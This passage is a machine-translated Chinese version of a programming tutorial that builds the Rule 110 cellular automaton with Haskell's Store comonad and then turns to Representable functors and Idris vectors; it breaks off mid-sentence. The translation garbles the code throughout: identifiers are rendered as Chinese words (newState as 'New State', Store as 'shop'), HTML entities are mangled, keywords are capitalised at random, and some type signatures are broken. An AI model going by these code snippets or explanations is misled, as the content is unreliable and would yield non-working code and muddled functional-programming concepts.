Penner\u4f7f\u7528\u53ef\u8868\u793a\u7684\u51fd\u6570\u5668\u5411\u6211\u4eec\u5c55\u793a\u4e86\u4e00\u4e2a\u5947\u5999\u7684\u89e3\u51b3\u65b9\u6848\u3002\u6211\u4eec\u5f88\u5feb\u5c31\u4f1a\u770b\u4e00\u4e0bReportable\uff0c\u4f46\u73b0\u5728\u8ba9\u6211\u4eec\u5ffd\u7565\u6027\u80fd\u95ee\u9898\uff0c\u5c06\u91cd\u70b9\u653e\u5728\u6211\u4eec\u9700\u8981\u7684\u5de5\u5177\u4e0a\uff0c\u4ee5\u4fbf\u5929\u771f\u5730\u5b9e\u73b0\u89c4\u5219110\u3002\nComonad\u662f\u5355\u66f2\u7684\u5bf9\u5076\u3002\u5355\u97f3\u8282\u901a\u8fc7a-&gt\uff1bm b\u5f62\u5f0f\u4e3a\u8bba\u70b9\u5f15\u5165\u4e00\u4e9b\u6548\u679c\uff0c\u800c\u5355\u97f3\u8282\u5219\u5f15\u5165\u67e5\u8be2\u6570\u636e\u7ed3\u6784\u7684\u6982\u5ff5(\u5171\u540c\u6548\u679c)\uff1a\n--\u4e00\u5143a-&&gt;m a\u91cd\u590d\uff1a\uff1aa-&&gt;\uff1b[a]--\u5e76\u5143w a-&gt\uff1ba\u957f\u5ea6\uff1a\uff1a[a]-&gt\uff1b\u6574\u6570\u3002\n\u7c7b\u51fd\u6570w=&gt\uff1bComonad w\u5176\u4e2dExtract\uff1a\uff1aw a-&gt\uff1ba\u526f\u672c\uff1a\uff1aw a-&gt\uff1bw(W A)\u6269\u5c55\uff1a\uff1a(w a-&gt\uff1bb)-&gt\uff1bw a-&gt\uff1bw b\u3002\n\u63d0\u53d6\uff1a\uff1aw a-&gt\uff1ba\u8fd4\u56de\uff1a\uff1aa-&gt\uff1bm\u526f\u672c\uff1a\uff1aw a-&gt\uff1bw(W A)\u8054\u63a5\uff1a\uff1am(M A)-&gt\uff1bm a\u6269\u5c55\uff1a\uff1a(w a-&gt\uff1bb)-&gt\uff1bw a-&gt\uff1bw b(=&lt\uff1b&lt\uff1b)\uff1a\uff1a(a-&gt\uff1bm b)-&gt\uff1bm a-&gt\uff1bm b\u3002\n\u5982\u679cHaskell\u4e2dComonad\u7684\u4e00\u4e2a\u5b9a\u4e49\u7279\u5f81\u662f\u63d0\u4f9b\u4e00\u79cd\u67e5\u8be2\u6570\u636e\u7ed3\u6784\u7684\u673a\u5236\uff0c\u90a3\u4e48\u6211\u4eec\u51e0\u4e4e\u53ef\u4ee5\u80af\u5b9a\u5730\u8bf4Store\u662f\u4e00\u4e2aComonad\u3002\u5b58\u50a8\u5b9e\u9645\u4e0a\u662f\u67e5\u8be2\u7ed3\u6784\u4ee5\u4ea7\u751f\u6570\u636e\u7684\u673a\u5236\uff01\n\u5b9e\u4f8bComonad(Store S)WHERE Extract\uff1a\uff1aStore s a-&gt\uff1ba Extract(Store Query S)=\u67e5\u8be2s Extension\uff1a\uff1a(Store s a-&&gt;b)-&gt\uff1bStore s a-&gt\uff1bStore s b Extension f(Store Query S)=Store(\\s&39\uff1b-&&gt;f(Store Query s&39\uff1b))s\nExtract\u5c06\u5f53\u524d\u6e38\u6807\u5e94\u7528\u4e8e\u67e5\u8be2\u51fd\u6570\uff0c\u5e76\u6269\u5c55\u94fe\u72b6\u6001\u8f6c\u6362\u67e5\u8be2\u3002\n\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0cExtract\u76f8\u5f53\u7b80\u5355\uff0c\u4f46Extension\u5219\u7a0d\u5fae\u68d8\u624b\u4e00\u4e9b\u3002\u8fd9\u6709\u52a9\u4e8e\u8003\u8651\u4e0e\u6211\u4eec\u7684FMAP\u5b9e\u73b0\u76f8\u5173\u7684\u95ee\u9898\u3002\n\u4e0eFMAP\u4e00\u6837\uff0c\u5b83\u4f7f\u7528\u4e00\u4e2a\u51fd\u6570\u6765\u4fee\u6539\u6211\u4eec\u7684\u9690\u5f0f\u72b6\u6001\uff0c\u4f46\u662f\u5f53FMAP\u4f7f\u7528\u6211\u4eec\u7684\u67e5\u8be2\u7ec4\u6210\u4e00\u4e2a\u7eafa-&gt;b\u51fd\u6570\u65f6\uff0cExtended\u901a\u8fc7\u5c06\u6574\u4e2a\u5b58\u50a8\u5e94\u7528\u4e8e\u4e00\u4e2a\u5171\u540c\u7684\u64cd\u4f5c\u6765\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u67e5\u8be2\u51fd\u6570\u3002\u8fd9\u5141\u8bb8\u6211\u4eec\u5728\u4fee\u6539\u5546\u5e97\u4e2d\u7684\u7279\u5b9a\u70b9\u65f6\u5c06\u6574\u4e2a\u5f53\u524d\u5546\u5e97\u7eb3\u5165\u8303\u56f4\u3002\nExtension\u975e\u5e38\u5f3a\u5927\uff0c\u5141\u8bb8\u6211\u4eec\u505a\u4e00\u4e9b\u975e\u5e38\u6709\u8da3\u7684\u4e8b\u60c5\uff0c\u6bd4\u5982\u521b\u5efa\u7a97\u53e3\u51fd\u6570\u548c\u6267\u884c\u5185\u6838\u5377\u79ef\u3002\u5b83\u5141\u8bb8\u6211\u4eec\u4f7f\u7528\u6574\u4e2a\u72b6\u6001\u4f5c\u4e3a\u4e0a\u4e0b\u6587\u6765\u4fee\u6539\u5e76\u884c\u4e2d\u7684\u6bcf\u4e2a\u5355\u72ec\u7684\u70b9\u3002\nEXTEND\u7684\u4e00\u4e2a\u6709\u8da3\u7684\u4f8b\u5b50\u662f\u5bf9\u4e00\u4e9b\u65f6\u95f4\u5e8f\u5217\u6570\u636e\u6267\u884c\u79fb\u52a8\u5e73\u5747\u3002\n\u9996\u5148\uff0c\u6211\u4eec\u9700\u8981\u4e00\u4e2a\u5b58\u50a8\u5efa\u6a21\u65f6\u95f4\u6392\u5e8f\u7684\u6570\u636e\u3002\u6211\u4eec\u5c06\u4f7f\u7528Int\u4f5c\u4e3a\u7d22\u5f15\uff0c\u5b83\u5c06\u8868\u793a\u6570\u636e\u6d41\u4e2d\u7684\u5355\u4e2a\u65f6\u95f4\u5355\u4f4d\u3002\u6211\u4eec\u9700\u8981\u4e00\u4e9b\u76f8\u5f53\u52a8\u6001\u7684\u6570\u636e\u6e90\uff0c\u6240\u4ee5\u6211\u9009\u62e9\u4e86Fibbonaci\u5e8f\u5217\u3002\u5728\u6bcf\u4e2a\u65f6\u95f4\u70b9(\u6bcf\u4e2a\u6307\u6570)\uff0c\u6211\u4eec\u5f97\u5230\u4e0b\u4e00\u4e2aFibbonaci\u6570\u3002\nFiStore\uff1a\uff1astore Int Int fib Store=store query 0 where query\uff1a\uff1aint-&gt\uff1bInt query 0=0 query 1=1 query n=query(n-1)+query(n-2)\u3002\n\u73b0\u5728\uff0c\u5982\u679c\u6211\u4eec\u60f3\u8981\u4ece\u7ed9\u5b9a\u7684\u6e38\u6807\u5f00\u59cb\u8ba1\u7b97\u4e00\u4e2a\u7a97\u53e3\uff0c\u9700\u8981\u67d0\u79cd\u65b9\u6cd5\u6765\u67e5\u8be2\u540e\u7eed\u7684\u65f6\u95f4\u70b9\u3002\u4f53\u9a8c\u5c06\u5728\u8fd9\u91cc\u5b8c\u7f8e\u53d1\u6325\u4f5c\u7528\uff1a\n\u73b0\u5728\u8bf7\u6ce8\u610f\uff0c\u7a97\u53e3\u7684\u5f62\u72b6\u662fStore Int a-&gt\uff1b[a]\u3002\u8fd9\u770b\u8d77\u6765\u5f88\u50cfEXTEND\uff1aSTORE s a-&gt\uff1bb\u7684\u5171\u540c\u64cd\u4f5c\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528EXTEND\u5c06\u7a97\u53e3\u5e94\u7528\u4e8eEnter Store\uff1a\n\u73b0\u5728\uff0c\u5982\u679c\u6211\u4eec\u770b\u4e00\u770b\u5546\u5e97\u4e2d\u7684\u4efb\u4f55\u6307\u6570\uff0c\u6211\u4eec\u4f1a\u770b\u5230\u4e00\u4e2a\u968f\u540e\u7684\u6590\u6ce2\u7eb3\u5947\u6570\u5b57\u7684\u7a97\u53e3\uff01\n\u6709\u4e86\u73b0\u5728\u53ef\u7528\u7684\u5de5\u5177\uff0c\u6211\u4eec\u53ef\u4ee5\u7b2c\u4e00\u6b21\u5c1d\u8bd5\u6211\u4eec\u7684\u89c4\u5219110\u7b97\u6cd5\u3002\nType Index=Int initializeStore\uff1a\uff1a[Bool]-&gt\uff1bStore Index Bool InitializeStore xs=Store query 0 where query\uff1a\uff1aindex-&gt\uff1bBool query i=xs\uff01\uff01\u6211\u3002\n\u6211\u4eec\u5c06\u521d\u59cb\u72b6\u6001\u5efa\u6a21\u4e3a\u5217\u8868\uff0c\u5e76\u5bf9\u67e5\u8be2\u4f7f\u7528\u4e0d\u5b89\u5168\u7684\u5217\u8868\u67e5\u627e\u51fd\u6570\u3002\u8fd9\u4e0d\u662f\u5f88\u7406\u60f3\uff0c\u4f46\u6211\u4eec\u53ea\u662f\u5728\u8bd5\u7740\u8d77\u8349\u4e00\u4efd\u7c97\u7565\u7684\u8349\u7a3f\u3002\n\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u9700\u8981\u4e00\u79cd\u67e5\u8be2\u7d22\u5f15\u53ca\u5176\u90bb\u5c45\u7684\u65b9\u6cd5\u3002\u5c31\u50cf\u6211\u4eec\u7684\u7a97\u53e3\u51fd\u6570\u4e00\u6837\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u8fd9\u91cc\u4f7f\u7528\u5b9e\u9a8c\u3002\n_lookupIndices\u662f\u6211\u4eec\u9700\u8981\u586b\u5145\u7684\u7c7b\u578b\u7a7a\u6d1e\u3002\u4eceNeighbor Values\u5f00\u59cb\uff0c\u6211\u4eec\u8ba9GHC\u544a\u8bc9\u6211\u4eeclookupIndices\u9700\u8981\u4ec0\u4e48\u5f62\u72b6\uff1a\n\u4f46\u8fd9\u89e3\u91ca\u4e86\u6211\u4eec\u7684\u81ea\u52a8\u673a\u751f\u6d3b\u5728\u4e00\u4e2a\u5706\u4e0a\uff0c\u800c\u4e0d\u662f\u4e00\u6761\u7ebf\u4e0a\u3002\u6211\u4eec\u9700\u8981\u80fd\u591f\u8bc6\u522b\u7b2c\u4e00\u4e2a\u548c\u6700\u540e\u4e00\u4e2a\u7d22\u5f15\uff0c\u5e76\u4f7f\u7528\u8be5\u4fe1\u606f\u9009\u62e9\u6b63\u786e\u7684\u90bb\u5c45\u3002\n\u7b2c\u4e00\u4e2a\u4e5f\u662f\u6700\u7b80\u5355\u7684\u89e3\u51b3\u65b9\u6848\u662f\u5c06\u5217\u8868\u7684\u957f\u5ea6\u4f5c\u4e3a\u503c\u4f20\u5165\uff1a\nType Index=Int type size=Int lookupIndices\uff1a\uff1asize-&gt\uff1bIndex-&gt\uff1b[Index]lookupIndices size I|i==0=[size-1\uff0c0\uff0c1]|i==size-1=[i-1\uff0ci\uff0c0]|\u5426\u5219=[i-1\uff0ci\uff0ci+1]\u90bb\u5c45\uff1asize-gt\uff1bStore Int Bool-&gt\uff1b[Bool]Neighbors size=\u5b9e\u9a8c(LookupIndices Size)\u3002\n\u901a\u8fc7\u4e00\u79cd\u673a\u5236\u6765\u67e5\u627e\u7d22\u5f15\u53ca\u5176\u90bb\u5c45\u7684\u72b6\u6001\uff0c\u6211\u4eec\u63a5\u4e0b\u6765\u9700\u8981\u4f7f\u7528\u8be5\u4fe1\u606f\u6765\u8ba1\u7b97\u7d22\u5f15\u7684\u4e0b\u4e00\u4e2a\u72b6\u6001\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528NeighbValues\u7684\u8f93\u51fa\u5927\u5c0f\u5199\u6765\u5b9e\u73b0\u8fd9\u4e00\u70b9\uff1a\n\u73b0\u5728\uff0c\u6211\u4eec\u9700\u8981\u5bf9\u90bb\u5c45\u7684\u72b6\u6001\u8fdb\u884c\u6848\u4f8b\u5206\u6790\uff0c\u5e76\u5e94\u7528\u6211\u4eec\u7684\u51c6\u5219\u6765\u786e\u5b9a\u7d22\u5f15\u5904\u7684\u65b0\u72b6\u6001\uff1a\nNewState\uff1a\uff1aSize-&gt\uff1b\u5b58\u50a8\u7d22\u5f15Bool-&gt\uff1bBool Newstate Size Store=\u6848\u4f8b\u90bb\u5c45\u5927\u5c0f\u5b58\u50a8[False\uff0cFalse\uff0cFalse]-&gt\uff1bFalse[True\uff0cFalse\uff0cFalse]-&gt\uff1bFalse[True\uff0cTrue\uff0cTrue]-&gt\uff1bFalse_-&gt\uff1bTrue\u3002\n\u6700\u540e\uff0c\u6211\u4eec\u9700\u8981\u4e00\u79cd\u5c06\u6b64\u8f6c\u6362\u5e94\u7528\u4e8e\u6574\u4e2a\u5546\u5e97\u7684\u65b9\u6cd5\uff0c\u4ee5\u521b\u5efa\u4e0b\u4e00\u4ee3\u81ea\u52a8\u673a\u3002\u4f38\u51fa\u63f4\u624b\u53bb\u8425\u6551\uff01\nNextGen\uff1a\uff1aSize-&gt\uff1b\u5546\u5e97\u7d22\u5f15Bool-&gt\uff1b\u5546\u5e97\u7d22\u5f15Bool NextGen Size=EXTEND(\u65b0\u5dde\u5927\u5c0f)\u3002\n\u8ba9\u6211\u4eec\u4f7f\u7528\u7b49\u5f0f\u63a8\u7406\u6765\u4ed4\u7ec6\u770b\u770b\u8c03\u7528NextGen\u65f6\u4f1a\u53d1\u751f\u4ec0\u4e48\uff1a\n\u4e0b\u4e00\u4ee3\u5927\u5c0fSTORE=EXTEND(Newstate Size)STORE=EXTEND(Newstate Size)(Store Query S)=Store(\\s&#39\uff1b-&&gt;\uff1b(Newstate Size)(Store Query s&#39\uff1b))s\u3002\n\u4e0b\u4e00\u4ee3\u5927\u5c0f(NextGen Size Store)=EXTEND(NESTATE SIZE)(EXTEND(NESTATE SIZE)STORE)=EXTEND(NESTATE SIZE)(EXTEND(NESTATE SIZE)(\u5b58\u50a8\u67e5\u8be2))=EXTEND(NESTATE SIZE)(Store(\\s&39\uff1b-&gt\uff1b(Newstate Size)(Store Query s&#39\uff1b))s)=Store(\\s&#39\uff1b&39\uff1b-&gt\uff1b(NEWSTATE SIZE)(STORE(\\s&39\uff1b-&gt\uff1b(\u65b0\u5dde\u5927\u5c0f)(\u5546\u5e97\u67e5\u8be2s&#39\uff1b))s&#39\uff1b&#39\uff1b))%s\u3002\n\u8fd9\u6709\u70b9\u96be\u7406\u89e3\uff0c\u4f46\u662f\u5982\u679c\u60a8\u7a0d\u5fae\u772f\u7740\u773c\u775b\u5c31\u53ef\u4ee5\u770b\u5230\uff0c\u6211\u4eec\u6b63\u5728\u901a\u8fc7\u94fe\u63a5\u5546\u5e97\u4e0a\u7684newstate\u8c03\u7528\u6765\u6784\u5efa\u6211\u4eec\u7684\u67e5\u8be2\u51fd\u6570\u3002\u56e0\u6b64\uff0c\u65e0\u8bba\u4f55\u65f6\u67e5\u8be2\u7d22\u5f15\uff0c\u7ec4\u5408\u67e5\u8be2\u51fd\u6570\u90fd\u4f1a\u591a\u6b21\u5c06NEWSTATE\u5e94\u7528\u5230\u60a8\u7684\u5546\u5e97\u3002\n\u5de5\u4f5c\u5b9e\u73b0\u7684\u6700\u540e\u4e00\u6b65\u662f\u4ee5\u5217\u8868\u5f62\u5f0f\u67e5\u770b\u5546\u5e97\u7684\u51fd\u6570\u3002\u8fd9\u672c\u8eab\u5e76\u4e0d\u662f\u7b97\u6cd5\u7684\u4e00\u90e8\u5206\uff0c\u4f46\u6211\u4eec\u786e\u5b9e\u60f3\u8981\u4e00\u79cd\u67e5\u770b\u7ed3\u679c\u7684\u65b9\u5f0f\uff01\nViewStore\uff1a\uff1aSize-&gt\uff1bStore Index Bool-&gt\uff1b[Bool]viewStore Size store=\u5b9e\u9a8c(const[0..size])store\u3002\n\u8981\u8fd0\u884c\u6a21\u62df\uff0c\u6211\u4eec\u53ef\u4ee5\u5728IO\u4e2d\u4f7f\u7528\u9012\u5f52\u51fd\u6570\u6765\u91cd\u590d\u6253\u5370viewStore\u7684\u7ed3\u679c\uff0c\u7136\u540e\u8c03\u7528NextGen\u6765\u66f4\u65b0\u72b6\u6001\uff1a\n\u8fd0\u884c\u6a21\u62df\uff1a\uff1aSIZE-&gt\uff1b\u5b58\u50a8\u7d22\u5f15Bool-&gt\uff1bIO()Run\u6a21\u62df\u5927\u5c0fSTORE=DO PRINT$viewStore SIZE STORE Run\u6a21\u62df\u5927\u5c0f$NextGen SIZE STORE\u3002\n\u8fd9\u4e2a\u5b9e\u73b0\u786e\u5b9e\u53ef\u4ee5\u5de5\u4f5c\uff0c\u4f46\u662f\u5982\u679c\u60a8\u5c1d\u8bd5\u8fd0\u884c\u5b83\uff0c\u60a8\u4f1a\u53d1\u73b0\u5b83\u5b58\u5728\u4e25\u91cd\u7684\u6027\u80fd\u95ee\u9898\u3002\u5ef6\u957f\u65b0\u4e00\u4ee3\u610f\u5473\u7740\u589e\u52a0\u5230\u65b0\u5dde\u7684\u4e00\u7cfb\u5217\u7535\u8bdd\u3002\n\u8fd9\u4e2a\u4e0d\u65ad\u589e\u957f\u7684\u67e5\u8be2\u51fd\u6570\u5728\u60a8\u6bcf\u6b21\u67e5\u770b\u7d22\u5f15\u65f6\u90fd\u5fc5\u987b\u8fdb\u884c\u5b8c\u6574\u7684\u8ba1\u7b97\u3002\u5f53\u6211\u4eec\u8c03\u7528runSimulation\u65f6\uff0c\u6211\u4eec\u5bf9\u6bcf\u4e00\u4ee3\u7684\u6bcf\u4e2a\u7d22\u5f15\u90fd\u8fd9\u6837\u505a\u3002\n\u4e0d\u8fc7\uff0c\u5b9e\u9645\u4e0a\u6bd4\u90a3\u66f4\u7cdf\uff01\u8981\u8ba1\u7b97\u6bcf\u4e2a\u6307\u6570\u7684\u65b0\u72b6\u6001\uff0c\u6211\u4eec\u8fd8\u5fc5\u987b\u67e5\u770b\u5176\u90bb\u5c45\u3002\u56e0\u6b64\uff0c\u8fd9\u610f\u5473\u7740\u5bf9\u4e8e\u6bcf\u4e2a\u7d22\u5f15\uff0c\u6211\u4eec\u5c06\u91cd\u590d\u76f8\u540c\u7684\u5de8\u5927\u67e5\u8be23\u6b21\uff01\n\u51fd\u6570f\u662f\u53ef\u8868\u793a\u7684\uff0c\u5982\u679c\u5b83\u5177\u6709\u5b8c\u5168\u7d22\u5f15f\u7684\u5bf9\u5e94\u7c7b\u578bRep f\u3002\u5bf9\u4e8eRep f\u7684\u6bcf\u4e2a\u503c\uff0c\u5fc5\u987b\u6709\u4e00\u4e2a\u6709\u6548\u7684f\u7d22\u5f15\uff0c\u540c\u65f6\u6211\u4eec\u5fc5\u987b\u80fd\u591f\u6784\u9020\u4e00\u4e2a\u5bb9\u5668\uff0c\u5176\u4e2d\u5bb9\u5668\u4e2d\u7684\u6bcf\u4e2a\u5143\u7d20\u90fd\u662f\u4ece\u5176Rep f\u7d22\u5f15\u4e2d\u4ea7\u751f\u7684\u3002\n\u53e6\u4e00\u79cd\u66f4\u6b63\u5f0f\u7684\u8868\u8ff0\u65b9\u5f0f\u662f\uff0cf a\u548cRep f-&gt\uff1ba\u4e4b\u95f4\u5fc5\u987b\u5b58\u5728\u540c\u6784\u3002\u6765\u81ea\u53ef\u8868\u793a\u7c7b\u578b\u7c7b\u7684\u8868\u683c\u548c\u7d22\u5f15\u51fd\u6570\u8bc1\u660e\u4e86\u8fd9\u79cd\u540c\u6784\uff1a\n\u7c7b\u51fd\u6570f=&gt\uff1b\u53ef\u8868\u793af\uff0c\u5176\u4e2d\u7c7b\u578bRep f\uff1a\uff1a*Tablate\uff1a\uff1a(Rep f-&gt\uff1ba)-&gt\uff1bf a\u7d22\u5f15\uff1a\uff1af a-&gt\uff1b(Rep f-&gt\uff1ba)\u3002\n\u5f88\u96be\u786e\u5207\u5730\u770b\u51fa\u8fd9\u5bf9\u6211\u4eec\u6709\u4ec0\u4e48\u7528\u5904\uff0c\u4f46\u6211\u4eec\u53ef\u4ee5\u73a9\u4e00\u4e2a\u806a\u660e\u7684\u628a\u620f\uff0c\u8ba9\u4ee3\u8868\u4eba\u514d\u8d39\u83b7\u5f97\u5907\u5fd8\u5f55\u3002\nTABLATE\u5c06\u63a5\u53d7\u4e00\u4e9b\u51fd\u6570\uff0c\u8be5\u51fd\u6570\u4eceRepf\u503c\u751f\u6210a\u503c\uff0c\u7136\u540e\u6784\u9020\u4e00\u4e2a\u53ef\u8868\u793a\u7684f\uff0c\u5176\u4e2d\u5305\u542b\u6bcf\u4e2a\u53ef\u80fd\u7684Repf\u503c\u7684a\u503c\u3002\n\u7d22\u5f15\u5141\u8bb8\u60a8\u4f7f\u7528Rep f\u6765\u67e5\u8be2a\u503c\u7684\u53ef\u8868\u793af\u3002RETRACTABLE\u7684\u4e00\u4e2a\u5f88\u597d\u7684\u5c5e\u6027\u662f\uff0c\u5982\u679c\u4f60\u6709\u4e00\u4e2a\u5408\u6cd5\u7684\u5b9e\u4f8b\uff0c\u90a3\u4e48\u7d22\u5f15\u5fc5\u987b\u662f\u4e00\u4e2a\u5b89\u5168\u7684\u51fd\u6570\uff0c\u800c\u4e0d\u9700\u8981\u53ef\u80fd\uff01\n\u51fd\u6570\u5668\u6700\u660e\u663e\u7684\u9996\u9009\u662f[]\uff0c\u4f46\u662f\u6211\u4eec\u4f1a\u5bf9rep f\u4f7f\u7528\u4ec0\u4e48\u5462\uff1fInt\u4e0d\u8d77\u4f5c\u7528\uff0c\u56e0\u4e3a\u60a8\u4e0d\u80fd\u5728[]\u4e2d\u4f7f\u7528\u8d1f\u7d22\u5f15\u3002NAT\u51e0\u4e4e\u53ef\u4ee5\u5de5\u4f5c\uff0c\u4f46\u662f\u5982\u679c\u5217\u8868\u4e3a\u7a7a\u4f1a\u53d1\u751f\u4ec0\u4e48\u5462\uff1f\u9057\u61be\u7684\u662f\uff0c[]\u6ca1\u6709\u53ef\u8868\u793a\u7684\u5b9e\u4f8b\u3002\nNonEmpty\u89e3\u51b3\u4e86\u8fd9\u4e9b\u95ee\u9898\uff0c\u4f46\u662f\u5bf9\u4e8e\u6bcf\u4e2aNAT\uff0c\u4ecd\u7136\u53ef\u4ee5\u6709\u4e00\u4e2a\u6ca1\u6709\u5143\u7d20\u7684NonEmpty\u3002\nNewtype Stream a=CONS a(Strema A)\u6570\u636eNAT=Z|S NAT\u5b9e\u4f8bfunctor Stream Where FMAP\uff1a\uff1a(a-&gt;b)-&gt\uff1bStream a-&gt\uff1bStream b FMAP f(Stream A As)=CONS(F A)(FMAP F As)\u5b9e\u4f8b\u53ef\u8868\u793a\u6d41\uff0c\u5176\u4e2dtype Rep f=NAT Tablate\uff1a\uff1a(NAT-&&gt;a)-&gt\uff1bStream a Tablate f=CONS(F Z)(Tablate(f.\u3002S))index\uff1a\uff1astream a-&&gt;\uff1bNAT-&&gt;\uff1ba index(CONS A As)Z=a index(CONS_AS)(SN)=index as n\u3002\n\u6570\u636e\u6807\u8bc6a=\u6807\u8bc6\u5b9e\u4f8b\u51fd\u6570\u5668\u6807\u8bc6\uff0c\u5176\u4e2dFMAP f(\u6807\u8bc6a)=\u6807\u8bc6(F A)\u5b9e\u4f8b\u53ef\u8868\u793a\u6807\u8bc6\uff0c\u5176\u4e2d\u7c7b\u578b\u8868\u793af=()TABLATLE\uff1a\uff1a(()-&gt\uff1ba)-&gt\uff1b\u6807\u8bc6a\u8868f=\u6807\u8bc6$f()index\uff1a\uff1a\u6807\u8bc6a-&gt\uff1b()-&gt\uff1ba\u7d22\u5f15(\u6807\u8bc6a)()=a\u3002\n\u7531\u4e8e\u6807\u8bc6\u53ea\u80fd\u5305\u542b\u5355\u4e2aa\uff0c\u5e76\u4e14()\u7531\u5355\u4e2a\u503c\u9a7b\u7559\uff0c\u56e0\u6b64\u6b64\u5b9e\u4f8b\u662f\u5408\u6cd5\u7684\u548c\u5b8c\u5168\u7684\u3002\uff1a)\u3002\n\u5982\u679c\u6211\u4eec\u7684Store\u53ea\u6709\u4e00\u4e2a\u5143\u7d20\uff0c\u90a3\u4e48\u6807\u8bc6\u5c06\u975e\u5e38\u9002\u5408\u8868\u793a\u5bf9\u5b83\u7684\u67e5\u8be2\uff0c\u540c\u6837\uff0c\u5982\u679c\u5b83\u6709\u65e0\u9650\u6570\u91cf\u7684\u5143\u7d20\uff0c\u5219Stream\u53ef\u80fd\u662f\u5b8c\u7f8e\u7684\u3002\u7136\u800c\uff0c\u6211\u4eec\u6b63\u5728\u5bfb\u627e\u4ecb\u4e8e\u4e24\u8005\u4e4b\u95f4\u7684\u4e1c\u897f\u3002\n\u6211\u4eec\u9700\u8981\u7684\u662f\u67d0\u79cd\u6709\u754c\u6570\u636e\u7ed3\u6784\uff0c\u4f46\u662f\u4e3a\u4e86\u4f7f\u5176\u53ef\u8868\u793a\uff0c\u6211\u4eec\u8fd8\u9700\u8981\u76f8\u5e94\u7684\u6709\u754c\u7d22\u5f15\u7c7b\u578bRep f\u3002Identity\u548c()\u5c31\u662f\u8fd9\u6837\u7684\u6709\u754c\u53ef\u8868\u793a\u7684\u4e00\u4e2a\u5f88\u597d\u7684\u4f8b\u5b50\uff0c\u4f46\u662f\u5b83\u7684\u754c\u9650\u662f1\u4e2a\u5143\u7d20\u7684\u56fa\u5b9a\u5927\u5c0f\u3002\u6211\u4eec\u60f3\u8981\u4e00\u4e9b\u51fd\u6570\u5668f\u548c\u4ee3\u8868f\uff0c\u5728\u90a3\u91cc\u6211\u4eec\u53ef\u4ee5\u5c06\u8fb9\u754c\u56fa\u5b9a\u5728\u6211\u4eec\u60f3\u8981\u7684\u4efb\u4f55\u5927\u5c0f\u3002\n\u53e6\u4e00\u79cd\u8bf4\u6cd5\u662f\uff0c\u6211\u4eec\u60f3\u8981\u7684\u662f\u4e00\u4e2a\u53ef\u8868\u793a\u51fd\u6570\u65cf\u548c\u4e00\u4e2a\u5bf9\u5e94\u7684Rep f\u7c7b\u578b\u65cf\uff0c\u6bcf\u4e2a\u53ef\u80fd\u7684\u5927\u5c0f\u8fb9\u754c\u5bf9\u5e94\u4e00\u4e2a\u914d\u5bf9\u3002\n\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528Vect n a\u548cFin n a\u6765\u5b9e\u73b0\u8fd9\u4e00\u70b9\u3002Vect\u662f\u4e00\u4e2a\u56fa\u5b9a\u957f\u5ea6\u7684\u5411\u91cf\uff0c\u5176\u957f\u5ea6\u7528\u7c7b\u578b\u7ea7\u522bNAT\u7f16\u7801\u3002FIN\u662f\u6709\u9650\u81ea\u7136\u6570\uff0c\u5176\u6700\u5927\u503c\u4f7f\u7528\u7c7b\u578b\u7ea7\u522bNAT\u8fdb\u884c\u7f16\u7801\u3002\nData Vect(n\uff1a\uff1aNAT)a WHERE VNIL\uff1a\uff1aVect Z a VCons\uff1a\uff1aA-&gt\uff1bVect n a-&gt\uff1bVect n a-&gt\uff1bVect(SN)a Data FIN(n\uff1a\uff1aNAT)Where FZ\uff1a\uff1aFIN(SN)FS\uff1a\uff1aFIN n-&gt\uff1bFin(SN)\u3002\n\u5c31\u8fd9\u6837\uff0c\u6211\u4eec\u8fdb\u5165\u4e86\u4f9d\u8d56\u7c7b\u578b\u7684\u4e16\u754c\u3002\u54c8\u65af\u514b\u5c14\u7684\u4e16\u754c\u975e\u5e38\u6df7\u4e71\u548c\u4ee4\u4eba\u56f0\u60d1\u3002\u73b0\u5728\u662f\u65f6\u5019\u5207\u6362\u5230Idris\u4e86\uff0c\u4f46\u662f\u4e0d\u8981\u62c5\u5fc3\u5230\u76ee\u524d\u4e3a\u6b62\u6240\u6709\u7684\u5b9e\u73b0\u90fd\u662f\u76f8\u540c\u7684\uff0c\u53ea\u662f\u7a0d\u6709\u4e00\u4e9b\u8bed\u6cd5\u4e0a\u7684\u53d8\u5316\u3002\n\u63a5\u53e3\u51fd\u6570f=&gt\uff1b\u53ef\u8868\u793a(f\uff1atype-&gt\uff1btype)(rep\uff1atype)|f\u5176\u4e2dTABLATE\uff1a(rep-&gt\uff1ba)-&gt\uff1bf a\u7d22\u5f15\uff1af a-&gt\uff1brep-&gt\uff1ba\u53ef\u8868\u793a(Vect N)(Fin N)\uff0c\u5176\u4e2dTABLATE f{n=Z}=[]TABLATE f{n=(S K)}=f FZ\uff1a\uff1aTABLATE(f.\u3002Fs)index(x\uff1a\uff1a_)fz{n=(Sk)}=x index(_\uff1a\uff1axs)(FS X){n=(Sk)}=index xs x\u3002\n\u5728Idris\u4e2d\uff0c&#34\uff1b\u7c7b\u578bLevel&#34\uff1b\u548c&#34\uff1bTerm Level\u4e4b\u95f4\u6ca1\u6709\u533a\u522b\u3002&#34\uff1b\u7c7b\u578b\u662f\u4e00\u6d41\u7684\u503c\uff0c\u53ef\u4ee5\u50cf\u4efb\u4f55\u5176\u4ed6\u503c\u4e00\u6837\u4f20\u9012\u548c\u4f7f\u7528\u3002\n\u76f8\u5e94\u5730\uff0c\u7c7b\u578b\u53c2\u6570(\u5982Vect n(Fin N)\u4e2d\u7684n)\u4e0e\u672f\u8bed\u7ea7\u522b\u53c2\u6570\u76f8\u540c\uff0c\u53ef\u4ee5\u4f20\u9012\u5230\u5339\u914d\u7684\u51fd\u6570\u548c\u6a21\u5f0f\u4e2d\u3002\u60a8\u53ef\u4ee5\u5728\u4e0a\u9762\u7684TABLATE\u5b9a\u4e49\u4e2d\u770b\u5230\u8fd9\u4e00\u70b9\uff0c\u5176\u4e2d\u6765\u81eaVect 